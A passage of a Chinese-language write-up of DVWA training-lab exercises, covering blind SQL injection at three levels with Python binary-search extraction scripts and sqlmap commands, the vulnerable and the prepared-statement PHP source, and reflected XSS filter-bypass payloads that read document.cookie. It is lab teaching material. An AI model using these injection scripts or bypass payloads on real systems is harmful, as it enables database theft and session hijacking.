    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];

    <span class="hljs-comment">// Check database</span>
    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        $first = $row[<span class="hljs-string">"first_name"</span>];
        $last  = $row[<span class="hljs-string">"last_name"</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
    &#125;

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<div class="hljs"><pre><code class="hljs sql">$query  = "<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'$id'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;";</code></pre></div>

<p>存在注入的语句只是在low级别的基础上加上了<code>Limit</code>限制了回显的行数，但是使用low级别的注入语句时会直接把<code>Limit 1</code>注释掉，所以完全与low级别一样。</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="手工加脚本"><a href="#手工加脚本" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>查询成功返回的语句：User ID exists in the database.</p>
<p>查询失败返回的语句：User ID is MISSING from the database.</p>
<p>这样就可以利用提示信息确定，我们所查询的语句是否正确</p>
<p>首先确定盲注的语句</p>
<p>通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。</p>
<div class="hljs"><pre><code class="hljs routeros">1<span class="hljs-string">' and ascii(substring(database(),1,1))&gt;50 #</span>
<span class="hljs-string">提示 ：User ID exists in the database.</span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">and</span> ascii(substring(database(),1,1))&lt;50 #
提示：<span class="hljs-built_in"> User </span>ID is MISSING <span class="hljs-keyword">from</span> the database.</code></pre></div>





<p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" srcset="/img/loading.gif" alt="image-20201026201632666"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/10/26 17:29</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : dvwa.py</span>
<span class="hljs-comment"># 二分法盲注</span>
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id="</span>

header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span>&#125;
flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#获取数据库名</span>
        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
        <span class="hljs-comment">#获取表名</span>
        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        <span class="hljs-comment">#获取列名</span>
        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        <span class="hljs-comment">#获取flag</span>
        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
        url1 =url+payload+<span class="hljs-string">"&amp;Submit=Submit#"</span>
        response = requests.post(url1,headers= header)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + chr(mid)
print(flag)</code></pre></div>

<p>1.首先获取表名</p>
<p>使用payload:</p>
<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" srcset="/img/loading.gif" alt="bsqll-1.png"></p>
<p>2.获取列名</p>
<p>使用payload</p>
<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" srcset="/img/loading.gif" alt="bsqll-2.png"></p>
<p>3.获取flag</p>
<p>使用payload</p>
<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" srcset="/img/loading.gif" alt="bsqll-3.png"></p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>



<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="手工加脚本-1"><a href="#手工加脚本-1" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=4 #&amp;<span class="hljs-attribute">Submit</span>=Submit
提示User ID exists <span class="hljs-keyword">in</span> the database.
<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=5 #&amp;<span class="hljs-attribute">Submit</span>=Submit
User ID is MISSING <span class="hljs-keyword">from</span> the database</code></pre></div>

<p>所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型</p>
<p>直接上脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>

header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;
flag = <span class="hljs-string">""</span>
t = <span class="hljs-string">""</span>
sum=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = "1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        payload = <span class="hljs-string">"1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
        data = &#123;<span class="hljs-string">'id'</span>: payload, <span class="hljs-string">'Submit'</span>: <span class="hljs-string">'Submit'</span>&#125;

        response = requests.post(url,headers = header,data=data)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    print(mid)
    flag = flag + chr(mid)
print(flag)</code></pre></div>

<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--dbs</span>


python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa <span class="hljs-params">--tables</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag <span class="hljs-params">--columns</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div>



<p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" srcset="/img/loading.gif" alt="bsqlh-1.png"></p>
<p>sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去</p>
<p>下面是sqlmap爆出的flag。</p>
<p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" srcset="/img/loading.gif" alt="bsqlh-2.png"></p>
<p>源码分析</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123; 
    <span class="hljs-comment">// Get input </span>
    $id = $_POST[ <span class="hljs-string">'id'</span> ]; 
    $id = mysql_real_escape_string( $id ); 

    <span class="hljs-comment">// Check database </span>
    $getid  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; 
    $result = mysql_query( $getid ); <span class="hljs-comment">// Removed 'or die' to suppress mysql errors </span>

    <span class="hljs-comment">// Get results </span>
    $num = @mysql_numrows( $result ); <span class="hljs-comment">// The '@' character suppresses errors </span>
    <span class="hljs-keyword">if</span>( $num &gt; <span class="hljs-number">0</span> ) &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; 
    &#125; 
    <span class="hljs-keyword">else</span> &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; 
    &#125; 

    <span class="hljs-comment">//mysql_close(); </span>
&#125; 

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><strong>mysql_real_escape_string()</strong> 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> 和 <code>\x1a</code>.</p>
<p>本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样</p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-string">GET</span> <span class="hljs-string">/dvwa/vulnerabilities/sqli_blind/</span> <span class="hljs-string">HTTP/1.1</span>
<span class="hljs-attr">Host:</span> <span class="hljs-number">10.5</span><span class="hljs-number">.8</span><span class="hljs-number">.66</span>
<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64;</span> <span class="hljs-string">rv:82.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/82.0</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="hljs-attr">Referer:</span> <span class="hljs-string">http://10.5.8.66/dvwa/vulnerabilities/sqli/</span>
<span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span>
<span class="hljs-attr">Cookie:</span> <span class="hljs-string">id=1;</span> <span class="hljs-string">security=high;</span> <span class="hljs-string">PHPSESSID=e31dkassqtg9388l159fn72ac1</span>
<span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span>
<span class="hljs-attr">Cache-Control:</span> <span class="hljs-string">max-age=0</span></code></pre></div>

<p>抓包后可以发现提交的参数<code>id</code>在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。</p>
<h4 id="手工加脚本-2"><a href="#手工加脚本-2" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置</p>
<p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" srcset="/img/loading.gif" alt="bsqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" srcset="/img/loading.gif" alt="bsqlh-4.png"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>
t=<span class="hljs-string">""</span>
flag = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
        id = payload
        header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"id="</span>+payload+<span class="hljs-string">";"</span>+<span class="hljs-string">"security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;
        <span class="hljs-comment">#print(header)</span>
        response = requests.post(url,headers = header)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    print(mid)
    <span class="hljs-comment">#print(t)</span>
    flag = flag + chr(mid)
print(flag)</code></pre></div>



<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>

python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" srcset="/img/loading.gif" alt="bsqlh-5.png"></p>
<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><p>通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );

    <span class="hljs-comment">// Get input</span>
    $id = $_GET[ <span class="hljs-string">'id'</span> ];

    <span class="hljs-comment">// Was a number entered?</span>
    <span class="hljs-keyword">if</span>(is_numeric( $id )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
        <span class="hljs-comment">// Check the database</span>
        $data = $db-&gt;prepare( <span class="hljs-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
        $data-&gt;bindParam( <span class="hljs-string">':id'</span>, $id, PDO::PARAM_INT );
        $data-&gt;execute();

        <span class="hljs-comment">// Get results</span>
        <span class="hljs-keyword">if</span>( $data-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;
            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;
        &#125;
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// User wasn't found, so the page wasn't!</span>
            header( $_SERVER[ <span class="hljs-string">'SERVER_PROTOCOL'</span> ] . <span class="hljs-string">' 404 Not Found'</span> );

            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
generateSessionToken();

<span class="hljs-meta">?&gt;</span></code></pre></div>





<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);

<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="hljs-string">'name'</span> ] . <span class="hljs-string">'&lt;/pre&gt;'</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p>
<p>先测试一下</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">"xss"</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" srcset="/img/loading.gif" alt="image-20201026202557058"></p>
<p>获取cookie</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" srcset="/img/loading.gif" alt="image-20201026202647823"></p>
<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码审计后可以发现是对输入的内容进行了过滤，将<strong>&lt;script&gt;</strong>替换为空，可以双写绕过，也可以大小写绕过。</p>
<p>构造payload：</p>
<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
//使用其他标签
<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $_GET[ <span class="hljs-string">'name'</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

